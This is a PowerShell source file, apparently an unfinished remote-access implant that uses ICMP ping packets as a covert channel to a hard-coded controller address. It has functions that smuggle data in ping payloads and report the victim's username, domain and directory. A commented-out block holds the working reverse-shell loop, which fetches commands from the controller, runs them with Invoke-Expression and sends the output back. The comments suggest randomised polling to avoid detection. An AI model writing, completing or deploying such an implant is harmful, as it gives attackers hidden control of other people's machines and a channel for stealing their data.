enum ImplantMessageType {
  Prompt
  Empty
  CommandResultPart
  CommandResultEnd
}

enum ImplantState {
	WaitingForInstruction
	SendingCommandResult
}

enum ServerMessageType {
  NeedsPrompt
  IssuingCommand
	Stop
}

# Configure me!
$IP = '10.0.0.189';
$BufferSize = 65535;
$PingTimeout = 10 * 1000;

$Ping = New-Object System.Net.NetworkInformation.Ping;
$PingOptions = New-Object System.Net.NetworkInformation.PingOptions;
$PingOptions.DontFragment = $True;

Function Send-ICMPMessage([string]$Message) {
	$MessageBytes = [Text.Encoding]::UTF8.GetBytes($Message);
	Write-Host $MessageBytes;
	# Iterates over the message in chunks the size of $BufferSize and sends it to the target.
	for ($Index = 0; $Index -lt $MessageBytes.Count; $Index += $BufferSize) {
		$MessageBytesSubstring = $MessageBytes[$Index..$($Index + $BufferSize - 1)];
		$Ping.Send($IP, $PingTimeout, $MessageBytesSubstring, $PingOptions) | Out-Null;
	}
}
Function Receive-ICMPMessage {
	# Receive data until the message is complete
	$Buffer = New-Object Byte[] 0;
	do {
		$Reply = $Ping.Send($IP, $PingTimeout, (New-Object Byte[] 0), $PingOptions);
		Write-Host $Reply.Address $Reply.Buffer $Reply.Options $Reply.RoundtripTime $Reply.Status;
		$Buffer += $Reply.Buffer;
	} while ($Reply.Buffer.Count -gt 0)
	
	if ($Buffer.Count -gt 0) { Write-Host "Received bytes:" $Buffer; return [Text.Encoding]::UTF8.GetString($Buffer); }
	else { Write-Host "No bytes received."; return $null; }
}
Function Get-Prompt([string]$Status = [char]0x270D + ' ') {
	# Customize your prompt!
	return "$Status ($env:USERNAME@$env:USERDOMAIN) $((Get-Location).Path)> ";
}

[ImplantState]$State = [ImplantState]::WaitingForInstruction;
while ($True) {
	switch ($State) {
		WaitingForInstruction {
			Break;
		}
		SendingCommandResult {
			Break;
		}
	}
}

# Send-ICMPMessage (Get-Prompt);
# while ($True) {
# 	# Check for new commands to run.
# 	$Command = Receive-ICMPMessage;
# 	Write-Host "Command: $Command"
# 	if ($Command) {
# 		try {
# 			Write-Host "Running command: $Command"
# 			$CommandResult = (Invoke-Expression -Command $Command 2>&1 | Out-String);
# 			$Prompt = Get-Prompt ([char]0x2713);
# 		}
# 		catch {
# 			$CommandResult = $_.Exception.Message;
# 			$Prompt = Get-Prompt ([char]0x2717);
# 		}
# 		Send-ICMPMessage "$CommandResult`n$Prompt";
# 	}
# 	Start-Sleep -Seconds 5;
# 	# This is a polling delay. It is currently a 5 second heartbeat. You could also configure it to use an irregular and longer polling delay like the example below.
# 	# Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 180)
# }
